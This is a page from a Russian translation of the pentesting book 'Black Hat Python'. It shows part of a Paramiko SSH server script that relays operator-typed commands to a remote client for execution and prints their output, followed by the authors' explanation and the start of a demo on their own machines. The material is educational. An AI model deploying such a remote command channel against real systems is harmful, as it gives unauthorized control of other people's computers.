# Black Hat Python. Программирование для хакеров и пентестеров — страница 48

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

48   Глава 2. Основные сетевые инструменты
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)
    chan = bhSession.accept(20)
    if chan is None:
        print('*** No channel.')
        sys.exit(1)
    print('[+] Authenticated!') 
    print(chan.recv(1024)) 
    chan.send('Welcome to bh_ssh')
    try:
        while True:
            command= input("Enter command: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()
В этом примере мы используем SSH-ключ, входящий в состав демонстраци-
онных файлов Paramiko . Мы начинаем прослушивать сокет , как вы уже
видели ранее в этой главе, но затем добавляем поддержку SSH  и настраива-
ем методы аутентификации . Когда клиент аутентифицируется  и пошлет
нам сообщение ClientConnected , любая команда, введенная в SSH-сервер
(на компьютере, где запущен скрипт ssh_server.py), будет передаваться на
выполнение SSH-клиенту (на компьютер, где запущен скрипт ssh_rcmd.py),
а тот в свою очередь станет возвращать вывод SSH-серверу . Попробуем реа-
лизовать это на практике.
Проверка написанного
В демонстрационных целях клиент будет запущен на нашем (принадлежащем
авторам) компьютере под управлением Windows, а сервер — на Mac. Вот как
запускается сервер:
% python ssh_server.py
[+] Listening for connection ...
